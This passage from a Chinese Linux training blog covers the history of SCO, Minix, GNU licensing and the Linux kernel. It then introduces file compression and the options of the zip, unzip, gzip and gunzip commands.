<p>于是，SCO又和Novell公司干上了，开始了法庭上的互有胜负的对峙。</p>
<h5 id="树敌过多后的破产"><a href="#树敌过多后的破产" class="headerlink" title="树敌过多后的破产"></a>树敌过多后的破产</h5><p>“SCO公司在诉讼过程中树敌过多。”业内人士温伯格这样表示。连年诉讼耗尽了SCO资源，公司重点也没有放在业务上，话又说回来，其Unix业务已日薄西山，也没啥好继续开展的了。</p>
<p>2007年8月，美国犹他州地方法院一名法官裁定，Unix操作系统的版权归属于Novell，而不是SCO。这意味着SCO需要向Novell支付数百万美元的赔偿。</p>
<p>此举也意味着，SCO在与IBM进行的法律大战中失去胜算。Linux阵营头顶的乌云也随即散去。这年12月27日，SCO正式被纳斯达克摘牌。</p>
<p>芥川龙之介说过：人生好比一盒火柴，严禁使用是愚蠢的，滥用则是危险的。</p>
<p><img src="pic/002.jpg" alt="002"></p>
<h3 id="Minix"><a href="#Minix" class="headerlink" title="Minix"></a>Minix</h3><p>Minix原来是荷兰阿姆斯特丹的Vrije大学计算机科学系的Andrew S. Tanenbaum教授所发展的一个类Unix操作系统。全部的程序码共约12,000行，并置于他的著作Operating Systems: Design andImplementation(ISBN 0-13-637331-3)的附录里作为范例。Minix的系统要求在当时来说非常简单，只要三片磁片就可以启动。Minix原始是设计给1980年代到1990年代的IBM PC和IBM PC/AT兼容电脑上执行。1.5版也有移植到以Motorola 68000系列CPU为基础的电脑上（如Atari ST，Amiga，和早期的Apple Macintosh）和以SPARC为基础的机器（如升阳sun公司的工作站）。2.0版则只有x86架构的版本。</p>
<p>因为AT&amp;T的政策改变，在Version 7 Unix推出之后，发布新的使用条款，将UNIX源代码私有化，在大学中不再能使用UNIX源代码。塔能鲍姆教授为了能在课堂上教授学生操作系统运作的实务细节，决定在不使用任何AT&amp;T的源代码前提下，自行开发与UNIX兼容的操作系统，以避免版权上的争议。他以小型UNIX（mini-UNIX）之意，将它称为MINIX。</p>
<p>全套Minix除了起动的部份以汇编语言编写以外，其他大部份都是纯粹用C语言编写。分为：内核、内存管理及档案管理三部份。</p>
<h4 id="与Linux的关系"><a href="#与Linux的关系" class="headerlink" title="与Linux的关系"></a>与Linux的关系</h4><p>如果想了解类Unix系统的内部工作情况，学生可以在他们自己的电脑上运行Minix。据报道，即使是毫无经验的学生也能在几个月的典型培训课程的学习中获得对整个系统的很好的了解。Minix最有名的学生用户是Linus Torvalds，他在芬兰的赫尔辛基大学用Minix操作平台建立了一个新的操作系统的内核，他把它叫做Linux。</p>
<p>Linux是其作者受到Minix的影响而作成的（Linus Torvalds不喜欢他的386电脑上的MS-DOS操作系统，安装了Minix，并以它为样本开发了原始的Linux内核）。但在设计哲学上，Linux则和Minix大相迳庭。Minix在内核设计上采用微内核的原则，但Linux则和原始的Unix相同都采用宏内核的概念。在Linux发展之初，双方还于1992年在新闻组上有过一场精彩的理念争论。Minix的作者和支持者认为Linux的单内核构造是“向七十年代的大倒退”，而Linux的支持者认为Minix本身没有实用性。</p>
<h4 id="授权方式"><a href="#授权方式" class="headerlink" title="授权方式"></a>授权方式</h4><p>在授权方式上，Minix的版权宣告在早期被认为是相当自由的，在作者Andrew S. Tanenbaum希望拿Minix作为一个公开的教材与出版社希望保护程序码著作财产权的平衡下，它只要求一个相当低的授权费。但因为它并不是一个开放源码的授权方案，所以志愿工作者在以GPL方式散布的Linux核心出现后就多转向Linux平台。而Unix也在柏克莱系统与AT&amp;T达成协议后，出现了以BSD 授权散布的FreeBSD开放平台。Minix虽然在2000年改用BSD 授权，但这时其它的操作系统在功能上大幅超越了它，而它失去了发展成一个广泛使用的操作系统的机会，只留下，如它的作者Andrew S. Tanenbaum，原来期望的，作为一个开放的教材的用途。</p>
<p><img src="pic/003.jpg" alt="003"></p>
<h3 id="GUN"><a href="#GUN" class="headerlink" title="GUN"></a>GUN</h3><p>GNU计划，又称革奴计划，是由Richard Stallman在1983年9月27日公开发起的。它的目标是创建一套完全自由的操作系统。Richard Stallman最早是在net.unix-wizards新闻组上公布该消息，并附带《GNU宣言》等解释为何发起该计划的文章，其中一个理由就是要“重现当年软件界合作互助的团结精神”。为保证GNU软件可以自由地“使用、复制、修改和发布”，所有GNU软件都有一份在禁止其他人添加任何限制的情况下授权所有权利给任何人的协议条款，GNU通用公共许可证（GNU General PublicLicense，GPL）。即“反版权”（或称Copyleft）概念。</p>
<h4 id="历史"><a href="#历史" class="headerlink" title="历史"></a>历史</h4><p>1985年Richard Stallman又创立了自由软件基金会（Free Software Foundation）来为GNU计划提供技术、法律以及财政支持。尽管GNU计划大部分时候是由个人自愿无偿贡献，但FSF有时还是会聘请程序员帮助编写。当GNU计划开始逐渐获得成功时，一些商业公司开始介入开发和技术支持。当中最著名的就是之后被Red Hat兼并的Cygnus Solutions。</p>
<p>到了1990年，GNU计划已经开发出的软件包括了一个功能强大的文字编辑器Emacs[1] 。GCC（GNUCompiler Collection，GNU编译器集合），是一套由 GNU 开发的编程语言编译器。以及大部分UNIX系统GNU操作系统的内核Linux的程序库和工具。唯一依然没有完成的重要组件就是操作系统的内核(称为HURD)。</p>
<p>1991年Linus Torvalds编写出了与UNIX兼容的Linux操作系统内核并在GPL条款下发布。Linux之后在网上广泛流传，许多程序员参与了开发与修改。1992年Linux与其他GNU软件结合，完全自由的操作系统正式诞生。该操作系统往往被称为“GNU/Linux”或简称Linux。（尽管如此GNU计划自己的内核Hurd依然在开发中，已经发布Beta版本。）</p>
<p>许多UNIX系统上也安装了GNU软件，因为GNU软件的质量比之前UNIX的软件还要好。GNU工具还被广泛地移植到Windows和Mac OS上。</p>
<h4 id="协议条款"><a href="#协议条款" class="headerlink" title="协议条款"></a>协议条款</h4><p>GNU 包含3个协议条款:</p>
<ol>
<li>GPL：GNU通用公共许可证（GNU General Public License）</li>
<li>LGPL：GNU较宽松公共许可证 (GNU Lesser General Public License）, ) ，旧称 GNU Library General Public License (GNU 库通用公共许可证)；</li>
<li>GFDL ： GNU自由文档许可证（GNU Free Documentation License ）的缩写形式。</li>
</ol>
<p>这里指的自由，并不是价格免费，这和价格无关而是使用软件对所有的用户来说是自由的。</p>
<p>通过如下途径实现这一目标：</p>
<ol>
<li>它要求软件以源代码的形式发布，并规定任何用户能够以源代码的形式将软件复制或发布给别的用户。</li>
<li>如果用户的软件使用了受 GPL 保护的任何软件的一部分，那么该软件就继承了 GPL 软件，并因此而成为 GPL 软件，也就是说必须随应用程序一起发布源代码。</li>
<li>GPL 并不排斥对自由软件进行商业性质的包装和发行，也不限制在自由软件的基础上打包发行其他非自由软件。</li>
</ol>
<p>由于GPL很难被商业软件所应用，它要求调用它的库的代码也得GPL，全部开放，并且一同发布，不能直接连接。所以后来GNU推出了LGPL许可证</p>
<p>在GPL与LGPL许可证保护下发布源代码的结果很相似，对旧代码所做的任何修改对于想知道这些代码的人必须是公开的，唯一真正的不同之处在于私人版权代码是否可以与开放源代码相互连接，LGPL允许实体连接私人代码到开放源代码，并可以在任何形式下发布这些合成的二进制代码。只要这些代码是动态连接的就没有限制。（使用动态链接时，即使是程序在运行中调用函数库中的函数时，应用程序本身和函数库也是不同的实体）</p>
<h4 id="自由软件"><a href="#自由软件" class="headerlink" title="自由软件"></a>自由软件</h4><p>“自由软件” 是权利问题，不是价格问题。要理解这个概念，自由应该是“言论自由”中的“自由”，而不是“免费啤酒”中的“免费”。</p>
<p>自由软件关乎使用者运行、复制、发布、研究、修改和改进该软件的自由。 更精确地说，自由软件赋予软件使用者四种自由：</p>
<ol>
<li>不论目的为何，有运行该软件的自由（自由之零）。</li>
<li>有研究该软件如何运行，以及按需改写该软件的自由（自由之一）。取得该软件源代码为达成此目的之前提。</li>
<li>有重新发布拷贝的自由，这样你可以借此来敦亲睦邻（自由之二）。</li>
<li>有改进该软件，以及向公众发布改进的自由，这样整个社群都可受惠（自由之三）。取得该软件源码为达成此目的之前提。</li>
</ol>
<p><img src="pic/006.jpg" alt="004"></p>
<h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>Linux是一套免费使用和自由传播的类Unix操作系统，是一个基于POSIX和UNIX的多用户、多任务、支持多线程和多CPU的操作系统。它能运行主要的UNIX工具软件、应用程序和网络协议。它支持32位和64位硬件。Linux继承了Unix以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。Linux操作系统诞生于1991 年10 月5 日（这是第一次正式向外公布时间）。Linux存在着许多不同的Linux版本，但它们都使用了Linux内核。Linux可安装在各种计算机硬件设备中，比如手机、平板电脑、路由器、视频游戏控制台、台式计算机、大型机和超级计算机。</p>
<p>严格来讲，Linux这个词本身只表示Linux内核，但实际上人们已经习惯了用Linux来形容整个基于Linux内核，并且使用GNU 工程各种工具和数据库的操作系统。</p>
<h4 id="Linux简史"><a href="#Linux简史" class="headerlink" title="Linux简史"></a>Linux简史</h4><p>Linux 操作系统的诞生、发展和成长过程始终依赖着五个重要支柱：UNIX 操作系统、MINIX 操作系统、GNU计划、POSIX 标准和Internet 网络。</p>
<p>1981 年IBM公司推出微型计算机IBM PC。</p>
<p>1991年，GNU计划已经开发出了许多工具软件，最受期盼的GNU C编译器已经出现，GNU的操作系统核心HURD一直处于实验阶段，没有任何可用性，实质上也没能开发出完整的GNU操作系统，但是GNU奠定了Linux用户基础和开发环境。</p>
<p>1991年初，林纳斯·托瓦兹开始在一台386sx兼容微机上学习minix操作系统。1991年4月，林纳斯·托瓦兹开始酝酿并着手编制自己的操作系统。</p>
<p>1991 年4 月13 日在comp.os.minix 上发布说自己已经成功地将bash 移植到了minix 上，而且已经爱不释手、不能离开这个shell 软件了。</p>
<p>1991年7月3日，第一个与Linux有关的消息是在comp.os.minix上发布的（当然此时还不存在Linux这个名称，当时林纳斯·托瓦兹的脑子里想的可能是FREAX，FREAX的英文含义是怪诞的、怪物、异想天开等）。</p>
<p>1991年的10月5日，林纳斯·托瓦兹在comp.os.minix新闻组上发布消息，正式向外宣布Linux内核的诞生（Freeminix-like kernel sources for 386-AT）。</p>
<p>1993年，大约有100余名程序员参与了Linux内核代码编写/修改工作，其中核心组由5人组成，此时Linux 0.99的代码大约有十万行，用户大约有10万左右。</p>
<p>1994年3月，Linux1.0发布，代码量17万行，当时是按照完全自由免费的协议发布，随后正式采用GPL协议。</p>
<p>1995年1月，Bob Young创办了RedHat（小红帽），以GNU/Linux为核心，集成了400多个源代码开放的程序模块，搞出了一种冠以品牌的Linux，即RedHat Linux,称为Linux”发行版”，在市场上出售。这在经营模式上是一种创举。</p>
<p>1996年6月，Linux 2.0内核发布，此内核有大约40万行代码，并可以支持多个处理器。此时的Linux已经进入了实用阶段，全球大约有350万人使用。</p>
<p>1998年2月，以Eric Raymond为首的一批年轻的”老牛羚骨干分子”终于认识到GNU/Linux体系的产业化道路的本质，并非是什么自由哲学，而是市场竞争的驱动，创办了”Open Source Intiative”（开放源代码促进会）”复兴”的大旗，在互联网世界里展开了一场历史性的Linux产业化运动。</p>
<p>2001年1月，Linux 2.4发布，它进一步地提升了SMP系统的扩展性，同时它也集成了很多用于支持桌面系统的特性：USB，PC卡（PCMCIA）的支持，内置的即插即用，等等功能。</p>
<p>2003年12月，Linux 2.6版内核发布，相对于2.4版内核2.6在对系统的支持都有很大的变化。</p>
<p>2004年的第1月，SuSE嫁到了Novell，SCO继续顶着骂名四处强行“化缘”， Asianux，MandrakeSoft也在五年中首次宣布季度赢利。3月，SGI宣布成功实现了Linux操作系统支持256个Itanium 2处理器。</p>
<p><img src="pic/004.jpg" alt="005"></p>
<p><img src="pic/005.jpg" alt="006"></p>
]]></content>
      <categories>
        <category>技术培训</category>
        <category>Linux系统基础培训</category>
      </categories>
      <tags>
        <tag>培训</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 压缩打包</title>
    <url>/2016/12/22/booboo_linux_base/04-Linux%E5%8E%8B%E7%BC%A9%E6%89%93%E5%8C%85/</url>
    <content><![CDATA[<h2 id="压缩的意义和原理"><a href="#压缩的意义和原理" class="headerlink" title="压缩的意义和原理"></a>压缩的意义和原理</h2><h3 id="压缩的意义"><a href="#压缩的意义" class="headerlink" title="压缩的意义"></a>压缩的意义</h3><p>你是否遇到过以下情况：</p>
<ul>
<li>文件太大, 一个 u 盘无法全部复制? </li>
<li>备份某些重要数据 , 偏偏这些数据量太大了 , 耗掉了你太多的磁盘空间? </li>
</ul>
<p>这个时候，“文件压缩”技术可 就派上用场了 !</p>
<p>因为这些比较大型的文件透过所谓的文件压缩技术后 , 可以将他的磁盘使用量降低 , 可以达到减低文件容量的效果 , 此外 , 有的压缩程序还可以进行容量限制 , 使一个大型文件可以分割成为数个小型文件 , 以方便 U盘携带呢 !</p>
<h3 id="压缩的原理"><a href="#压缩的原理" class="headerlink" title="压缩的原理"></a>压缩的原理</h3><p>目前我们使用的计算机系统中都是使 bytes(字节)单位来计量的! 事实上 , 计算机最小的计量单位应该是 bits (比特)。</p>
<p>1 byte = 8 bits 。</p>
<p>如果让计算机记录 1 这个数字他会如何记录 ?</p>
<p>假设一个 byte 可以看成下面的样子 :</p>
<p>□□□□□□□□</p>
<p>Tips:</p>
<p>1 byte = 8 bits , 所以每个 byte 当中会有 8 个空格 , 而每个空格可以是 0, 或者 1 , 这里仅是做为一个粗略的介绍。由于我们记录数字是 1 , 表示成二进制就是 00000001 , 1 会在最右边占据 1 个 bit , 而其他 的 7 个bits 将会被填上 0 ! 有一种压缩技术示这么做的,他是将重复的数据进行统计记录的。</p>
<p>举个例子说 , 如果你的数据『 111…. 』共有 100 个 1 </p>
<p>那么压缩技术会记录为『 100 个 1 』而不是真的有 100 个 1 的位存在 ! </p>
<p>简单的说 , 你可以将他想成 , 其实文件里面有相当多的『空间』存在 , 并不是完全填满的 </p>
<ul>
<li>『压缩』 技术就是将这些『空间』填满 , 以让整个文件占用的容量下降 ! </li>
<li>『压缩过的档案』并无法直接被我们的操作系统所使用 , 因此 , 若要使用这些被压缩过的文件数据 , 则必项将他『还原』回到 未压缩前的模样 ,那就是所谓的『解压缩』啰 ! </li>
<li>至于压缩前与压缩后的档案所占用的磁盘空间大小 , 就可以被称为是『压缩比』。</li>
</ul>
<h3 id="压缩与解压缩的好处"><a href="#压缩与解压缩的好处" class="headerlink" title="压缩与解压缩的好处"></a>压缩与解压缩的好处</h3><p>最大的好处就是压缩过的文件容量变小了 , 所以你的 硬盘容量无形当中就可以容纳更多的资料。此外 , 在一些网络数据的传输中 , 也会由于数据量的降低 , 好让网络带宽可以用来作更多的工作 ! 而并是老是卡在一些大型的文件传输上面呢 ! 目前很多的 WWW 网站也是利用文件压缩的技术来进行数据的传送 , 好让网站带宽的可利用率上升。</p>
<h2 id="压缩打包命令"><a href="#压缩打包命令" class="headerlink" title="压缩打包命令"></a>压缩打包命令</h2><p>命令概览</p>
<ul>
<li><p>compress 是一个相当古老的 unix 档案压缩指令。</p>
</li>
<li><p>gzip 是 GNUzip 的缩写,它是一个 GNU( 全称是 GNU’s Not Unix ) 自由软件的文件压缩程序 ; 由于 gzip 可以产生更理想的压缩比例,一般人多已改用 gzip 为档案压缩工具。</p>
</li>
<li><p>bzip2 是一个基于 Burrows-Wheeler 变换的无损压缩软件,压缩效果比传统的 LZ77/LZ78 压缩算法来得好 ; 若说 gzip 是为了取代 compress 并提供更好的压缩比而成立的,那么 bzip2 则是为了取代 gzip 并提供更佳的压缩比而来的。 bzip2 这玩意的压缩比竟然比 gzip 还要好。</p>
</li>
<li><p>tar 命令最初的设计目的是将文件备份到磁带上 (tape archive) ,因而得名 tar 。</p>
</li>
</ul>
<p><img src="pic/01.png" alt="01"></p>
<h3 id="zip"><a href="#zip" class="headerlink" title=".zip"></a>.zip</h3><p>.zip 扩展名表示文件是使用许多 zip 归档程序和压缩程序之一(但不是 gzip )创建的。因为这是一种非常流行的压缩格式,算法的详细描述也有很多,所以可以找到用于所有操作系统的有用的移植形式。这包括创建和扩展带有 .zip 文件扩展名的档案的压缩和解压缩实用程序。在 Linux 上有两种这样的工具:</p>
<p>免费的 Info-ZIP 和以赢利为目的的 PKZIP for Linux 。</p>
<p>如果您只是偶尔需要创建或打开 zip 文件,使用 Info-ZIP 。如果希望使用在 MS-DOS 或其它系统上使用的相同工具,请选择PKZIP ( PKZIP 可用于许多操作系统)。用于微软 Windows 的 WinZIP 和用于 Mac OS 的Stufflt 这两种实用程序可以创建和打开相互之间兼容的档案。</p>
<p>Info-ZIP 在无法使用 gzip 或 tar 的情况下可以提供压缩和解压缩的一个不错的选择,这或许是在Linux 、微软 Windows 和 Mac OS 用户之间交换压缩文件的一种最好的形式。有许多不错的 zip 程序(有开放源码的,也有商业的)可用于这些操作系统,它们应该能确保文件的顺利交换(当然,只要是在特定于某个特定工具的特殊功能关闭的情况下)。</p>
<p>rhel7 默认带有 info-zip 软件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@mastera0 zip-3.0]# which zip</span><br><span class="line">/usr/bin/zip</span><br><span class="line">[root@mastera0 zip-3.0]# rpm -qf /usr/bin/zip</span><br><span class="line">zip-3.0-10.el7.x86_64</span><br><span class="line">[root@mastera0 zip-3.0]# head -n 18 /usr/share/doc/zip-3.0/README</span><br><span class="line">Zip 3.0 is the first Zip update adding large file support. For now Zip 2.3x</span><br><span class="line">remains available and supported, but users should switch to this new release.</span><br><span class="line">Testing for Zip 3.0 has focused mainly on Unix, VMS, Max OS X, and Win32,</span><br><span class="line">and some other ports may not be fully supported yet. If you find your</span><br><span class="line">favorite port is broke, send us the details or, better, send bug fixes. It's</span><br><span class="line">possible that support for some older ports may be dropped in the future.</span><br><span class="line">Copyright (c) 1990-2008 Info-ZIP. All rights reserved.</span><br><span class="line">See the accompanying file LICENSE (the contents of which are also included</span><br><span class="line">in unzip.h, zip.h and wiz.h) for terms of use. If, for some reason, all</span><br><span class="line">of these files are missing, the Info-ZIP license also may be found at:</span><br><span class="line">ftp://ftp.info-zip.org/pub/infozip/license.html and</span><br><span class="line">http://www.info-zip.org/pub/infozip/license.html.</span><br><span class="line">[root@mastera0 ~]# rpm -qi zip</span><br><span class="line">Name</span><br><span class="line">: zip</span><br><span class="line">Version : 3.0</span><br><span class="line">Release : 10.el7</span><br><span class="line">Architecture: x86_64</span><br><span class="line">Install Date: Thu 23 Jun 2016 01:50:41 PM CST</span><br><span class="line">Group</span><br><span class="line">: Applications/Archiving</span><br><span class="line">Size</span><br><span class="line">: 815045License : BSD</span><br><span class="line">Signature : RSA/SHA256, Thu 03 Apr 2014 06:52:17 AM CST, Key ID 199e2f91fd431d51</span><br><span class="line">Source RPM : zip-3.0-10.el7.src.rpm</span><br><span class="line">Build Date : Tue 28 Jan 2014 06:35:49 AM CST</span><br><span class="line">Build Host : x86-019.build.eng.bos.redhat.com</span><br><span class="line">Relocations : (not relocatable)</span><br><span class="line">Packager : Red Hat, Inc. &lt;http://bugzilla.redhat.com/bugzilla&gt;</span><br><span class="line">Vendor</span><br><span class="line">: Red Hat, Inc.</span><br><span class="line">URL</span><br><span class="line">: http://www.info-zip.org/Zip.html</span><br><span class="line">Summary : A file compression and packaging utility compatible with PKZIP</span><br><span class="line">Description :</span><br><span class="line">The zip program is a compression and file packaging utility. Zip is</span><br><span class="line">analogous to a combination of the UNIX tar and compress commands and</span><br><span class="line">is compatible with PKZIP (a compression and file packaging utility for</span><br><span class="line">MS-DOS systems).</span><br><span class="line">Install the zip package if you need to compress files using the zip</span><br><span class="line">program.</span><br></pre></td></tr></table></figure>

<h4 id="zip-命令用法"><a href="#zip-命令用法" class="headerlink" title="zip 命令用法"></a>zip 命令用法</h4><p>zip 命令可以用来解压缩文件,或者对文件进行打包操作。 zip 是个使用广泛的压缩程序,文件经它压缩后会另外产生具有 “ .zip” 扩展名的压缩文件。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 zip( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">-A :调整可执行的自动解压缩文件;</span><br><span class="line">-b&lt; 工作目录 &gt; :指定暂时存放文件的目录;</span><br><span class="line">-c :替每个被压缩的文件加上注释;</span><br><span class="line">-d :从压缩文件内删除指定的文件;</span><br><span class="line">-D :压缩文件内不建立目录名称;</span><br><span class="line">-f :此参数的效果和指定 “ -u” 参数类似,但不仅更新既有文件,如果某些文件原本不存在于压缩文</span><br><span class="line">件内,使用本参数会一并将其加入压缩文件中;</span><br><span class="line">-F :尝试修复已损坏的压缩文件;</span><br><span class="line">-g :将文件压缩后附加在已有的压缩文件之后,而非另行建立新的压缩文件;</span><br><span class="line">-h :在线帮助;</span><br><span class="line">-i&lt; 范本样式 &gt; :只压缩符合条件的文件;</span><br><span class="line">-j :只保存文件名称及其内容,而不存放任何目录名称;</span><br><span class="line">-J :删除压缩文件前面不必要的数据;</span><br><span class="line">-k :使用 MS-DOS 兼容格式的文件名称;</span><br><span class="line">-l :压缩文件时,把 LF 字符置换成 LF+CR 字符;</span><br><span class="line">-ll :压缩文件时,把 LF+cp 字符置换成 LF 字符;</span><br><span class="line">-L :显示版权信息;</span><br><span class="line">-m :将文件压缩并加入压缩文件后,删除原始文件,即把文件移到压缩文件中;</span><br><span class="line">-n&lt; 字尾字符串 &gt; :不压缩具有特定字尾字符串的文件;</span><br><span class="line">-o :以压缩文件内拥有最新更改时间的文件为准,将压缩文件的更改时间设成和该文件相同;</span><br><span class="line">-q :不显示指令执行过程;</span><br><span class="line">-r :递归处理,将指定目录下的所有文件和子目录一并处理;</span><br><span class="line">-S :包含系统和隐藏文件;</span><br><span class="line">-t&lt; 日期时间 &gt; :把压缩文件的日期设成指定的日期;</span><br><span class="line">-T :检查备份文件内的每个文件是否正确无误;</span><br><span class="line">-u :更换较新的文件到压缩文件内;</span><br><span class="line">-v :显示指令执行过程或显示版本信息;</span><br><span class="line">-V :保存 VMS 操作系统的文件属性;</span><br><span class="line">-w :在文件名称里假如版本编号,本参数仅在 VMS 操作系统下有效;</span><br><span class="line">-x&lt; 范本样式 &gt; :压缩时排除符合条件的文件;</span><br><span class="line">-X :不保存额外的文件属性;</span><br><span class="line">-y :直接保存符号连接,而非该链接所指向的文件,本参数仅在 UNIX 之类的系统下有效;</span><br><span class="line">-z :替压缩文件加上注释;</span><br><span class="line"><span class="meta">-$</span><span class="bash"> :保存第一个被压缩文件所在磁盘的卷册名称;</span></span><br><span class="line">-&lt; 压缩效率 &gt; :压缩效率是一个介于 1~9 的数值。</span><br><span class="line">参数</span><br><span class="line">zip 压缩包:指定要创建的 zip 压缩包;</span><br><span class="line">文件列表:指定要压缩的文件列表。</span><br><span class="line">实例</span><br><span class="line">zip -q -r html.zip /home/Blinux/html</span><br><span class="line">zip -q -r html.zip *</span><br></pre></td></tr></table></figure>

<h4 id="unzip-的用法"><a href="#unzip-的用法" class="headerlink" title="unzip 的用法"></a>unzip 的用法</h4><p>unzip 命令用于解压缩由 zip 命令压缩的 “ .zip” 压缩包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 unzip( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">-c :将解压缩的结果显示到屏幕上,并对字符做适当的转换;</span><br><span class="line">-f :更新现有的文件;</span><br><span class="line">-l :显示压缩文件内所包含的文件;</span><br><span class="line">-p :与 -c 参数类似,会将解压缩的结果显示到屏幕上,但不会执行任何的转换;</span><br><span class="line">-t :检查压缩文件是否正确;</span><br><span class="line">-u :与 -f 参数类似,但是除了更新现有的文件外,也会将压缩文件中的其他文件解压缩到目录中;</span><br><span class="line">-v :执行时显示详细的信息;</span><br><span class="line">-z :仅显示压缩文件的备注文字;</span><br><span class="line">-a :对文本文件进行必要的字符转换;</span><br><span class="line">-b :不要对文本文件进行字符转换;</span><br><span class="line">-C :压缩文件中的文件名称区分大小写;</span><br><span class="line">-j :不处理压缩文件中原有的目录路径;</span><br><span class="line">-L :将压缩文件中的全部文件名改为小写;</span><br><span class="line">-M :将输出结果送到 more 程序处理;</span><br><span class="line">-n :解压缩时不要覆盖原有的文件;</span><br><span class="line">-o :不必先询问用户, unzip 执行后覆盖原有的文件;</span><br><span class="line">-P&lt; 密码 &gt; :使用 zip 的密码选项;</span><br><span class="line">-q :执行时不显示任何信息;</span><br><span class="line">-s :将文件名中的空白字符转换为底线字符;</span><br><span class="line">-V :保留 VMS 的文件版本信息;</span><br><span class="line">-X :解压缩时同时回存文件原来的 UID/GID ;</span><br><span class="line">-d&lt; 目录 &gt; :指定文件解压缩后所要存储的目录;</span><br><span class="line">-x&lt; 文件 &gt; :指定不要处理 .zip 压缩文件中的哪些文件;</span><br><span class="line">-Z : unzip-Z 等于执行 zipinfo 指令</span><br><span class="line"></span><br><span class="line">参数 压缩包:指定要解压的 “ .zip” 压缩包。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">unzip test.zip</span><br><span class="line">unzip -v test.zip</span><br><span class="line">unzip -n test.zip -d /tmp</span><br></pre></td></tr></table></figure>

<h3 id="gz"><a href="#gz" class="headerlink" title=".gz"></a>.gz</h3><h4 id="gzip-的用法"><a href="#gzip-的用法" class="headerlink" title="gzip 的用法"></a>gzip 的用法</h4><p>gzip 命令用来压缩文件。 gzip 是个使用广泛的压缩程序,文件经它压缩过后,其名称后面会多处 “ .gz”扩展名。 gzip 是在 Linux 系统中经常使用的一个对文件进行压缩和解压缩的命令,既方便又好用。</p>
<p>gzip 不仅可以用来压缩大的、较少使用的文件以节省磁盘空间,还可以和 tar 命令一起构成 Linux 操作系统中比较流行的压缩文件格式。据统计, gzip 命令对文本文件有 60% ~ 70% 的压缩率。减少文件大小有两个明显的好处,一是可以减少存储空间,二是通过网络传输文件时,可以减少传输的时间。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 gzip( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">-a 或 —— ascii :使用 ASCII 文字模式;</span><br><span class="line">-d 或 --decompress 或 ----uncompress :解开压缩文件;</span><br><span class="line">-f 或 —— force :强行压缩文件。不理会文件名称或硬连接是否存在以及该文件是否为符号连接;</span><br><span class="line">-h 或 —— help :在线帮助;</span><br><span class="line">-l 或 —— list :列出压缩文件的相关信息;</span><br><span class="line">-L 或 —— license :显示版本与版权信息;</span><br><span class="line">-n 或 --no-name :压缩文件时,不保存原来的文件名称及时间戳记;</span><br><span class="line">-N 或 —— name :压缩文件时,保存原来的文件名称及时间戳记;</span><br><span class="line">-q 或 —— quiet :不显示警告信息;</span><br><span class="line">-r 或 —— recursive :递归处理,将指定目录下的所有文件及子目录一并处理;</span><br><span class="line">-S 或 &lt; 压缩字尾字符串 &gt; 或 ----suffix&lt; 压缩字尾字符串 &gt; :更改压缩字尾字符串;</span><br><span class="line">-t 或 —— test :测试压缩文件是否正确无误;</span><br><span class="line">-v 或 —— verbose :显示指令执行过程;</span><br><span class="line">-V 或 —— version :显示版本信息;</span><br><span class="line">-&lt; 压缩效率 &gt; :压缩效率是一个介于 1~9 的数值,预设值为 “ 6” ,指定愈大的数值,压缩效率就会</span><br><span class="line">愈高;</span><br><span class="line">--best :此参数的效果和指定 “ -9” 参数相同;</span><br><span class="line">--fast :此参数的效果和指定 “ -1” 参数相同。</span><br><span class="line"></span><br><span class="line">参数 文件列表:指定要压缩的文件或指定要解压的文件。。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line"></span><br><span class="line">gzip * 将当前目录下的每个文件都压缩成 .gz 文件</span><br><span class="line">gzip test 将 test 文件压缩成 test.gz 文件并删除源文件</span><br><span class="line">gzip -rv /tmp 第归压缩目录中的所有文件,压缩成 .gz 结尾的文件,并显示指令执行过程</span><br><span class="line">gizp -dr /tmp 第归解压 /tmp 目录下的 .gz 结尾的文件</span><br></pre></td></tr></table></figure>

<h4 id="gunzip-的用法"><a href="#gunzip-的用法" class="headerlink" title="gunzip 的用法"></a>gunzip 的用法</h4><p>gunzip 命令用来解压缩文件。 gunzip 是个使用广泛的解压缩程序,它用于解开被 gzip 压缩过的文件,这些压缩文件预设最后的扩展名为 .gz 。其实压缩或解压缩,都可通过 gzip 指令单独完成。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">语法 gunzip( 选项 )( 参数 )</span><br><span class="line"></span><br><span class="line">选项</span><br><span class="line"></span><br><span class="line">-a 或 —— ascii :使用 ASCII 文字模式;</span><br><span class="line">-c 或 --stdout 或 --to-stdout :把解压后的文件输出到标准输出设备;</span><br><span class="line">-f 或 -force :强行解开压缩文件,不理会文件名称或硬连接是否存在以及该文件是否为符号连接;</span><br><span class="line">-h 或 —— help :在线帮助;</span><br><span class="line">-l 或 —— list :列出压缩文件的相关信息;</span><br><span class="line">-L 或 —— license :显示版本与版权信息;</span><br><span class="line">-n 或 --no-name :解压缩时,若压缩文件内含有原来的文件名称及时间戳记,则将其忽略不予处理;</span><br><span class="line">-N 或 —— name :解压缩时,若压缩文件内含有原来的文件名称及时间戳记,则将其回存到解开</span><br><span class="line">的文件上;</span><br><span class="line">-q 或 —— quiet :不显示警告信息;</span><br><span class="line">-r 或 —— recursive :递归处理,将指定目录下的所有文件及子目录一并处理;</span><br><span class="line">-S 或 &lt; 压缩字尾字符串 &gt; 或 ----suffix&lt; 压缩字尾字符串 &gt; :更改压缩字尾字符串;</span><br><span class="line">-t 或 —— test :测试压缩文件是否正确无误;</span><br><span class="line">-v 或 —— verbose :显示指令执行过程;</span><br><span class="line">-V 或 —— version :显示版本信息;</span><br><span class="line"></span><br><span class="line">参数 文件列表:指定要解压的压缩包。</span><br><span class="line"></span><br><span class="line">实例</span><br><span class="line">gzip -d test.gz</span><br><span class="line">gunzip test.gz</span><br><span class="line">效果一样</span><br></pre></td></tr></table></figure>

